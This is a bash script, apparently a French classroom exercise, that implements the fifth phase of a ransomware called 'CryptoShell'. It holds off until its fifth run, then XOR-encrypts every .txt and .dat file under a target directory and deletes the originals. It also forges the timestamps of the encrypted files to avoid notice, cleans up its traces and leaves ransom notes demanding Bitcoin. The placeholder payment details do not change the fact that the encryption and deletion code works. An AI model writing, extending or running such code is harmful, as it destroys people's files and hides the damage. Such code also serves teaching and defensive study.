#!/bin/bash
# CryptoShell — Phase 5 : Version intégrée complète avec furtivité
# Usage: bash phase5_stealth.sh <répertoire_cible>

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "${SCRIPT_DIR}/../fournis/xor_helper.sh"

TARGET_DIR="${1:-.}"
KEY_FILE=".cryptoshell_key"
COUNTER_FILE=".cs_count"

# 5b) Nettoyage garanti avec trap (même en cas de Ctrl+C)
trap "rm -f /tmp/.cs_ref_$$ $KEY_FILE.tmp $COUNTER_FILE 2>/dev/null" EXIT SIGINT SIGTERM

# --- Déclencheur par compteur (Phase 4b) ---
count=0
if [ -f "$COUNTER_FILE" ]; then
    count=$(cat "$COUNTER_FILE" 2>/dev/null)
fi
count=$((count + 1))
echo "$count" > "$COUNTER_FILE" 2>/dev/null

if [ "$count" -lt 5 ]; then
    exit 0
fi
rm -f "$COUNTER_FILE" 2>/dev/null

# --- Génération clé et ID ---
VICTIM_ID=$(head -c 8 /dev/urandom | xxd -p 2>/dev/null)
KEY=$(generate_key 8)
echo "$KEY" > "$KEY_FILE" 2>/dev/null

create_ransom_note() {
    local dir="$1"
    cat > "${dir}/RANSOM_NOTE.txt" << EOF 2>/dev/null
============================================
        CRYPTOSHELL — VOS FICHIERS SONT CHIFFRÉS
============================================
Identifiant victime : ${VICTIM_ID}
Envoyez 0.5 BTC à [ADRESSE FICTIVE — TP ÉDUCATIF]
Contact : cryptoshell@fake-educational.example
[Ceci est un exercice éducatif]
============================================
EOF
}

# --- Chiffrement avec furtivité ---
find "$TARGET_DIR" -type f \( -name "*.txt" -o -name "*.dat" \) 2>/dev/null | while read filepath; do
    # Anti-surinfection
    case "$filepath" in *.locked) continue ;; esac
    [ "$(basename "$filepath")" = "RANSOM_NOTE.txt" ] && continue

    # 5a) Sauvegarder l'horodatage avant chiffrement
    touch -r "$filepath" "/tmp/.cs_ref_$$" 2>/dev/null

    # Chiffrer
    xor_file "$filepath" "${filepath}.locked" "$KEY" 2>/dev/null
    rm -f "$filepath" 2>/dev/null

    # 5a) Restaurer l'horodatage sur le fichier .locked
    touch -r "/tmp/.cs_ref_$$" "${filepath}.locked" 2>/dev/null

    # 5b) Supprimer la référence temporaire
    rm -f "/tmp/.cs_ref_$$" 2>/dev/null

    # Déposer la note de rançon
    DIR=$(dirname "$filepath")
    if [ ! -f "${DIR}/RANSOM_NOTE.txt" ]; then
        create_ransom_note "$DIR"
    fi
done
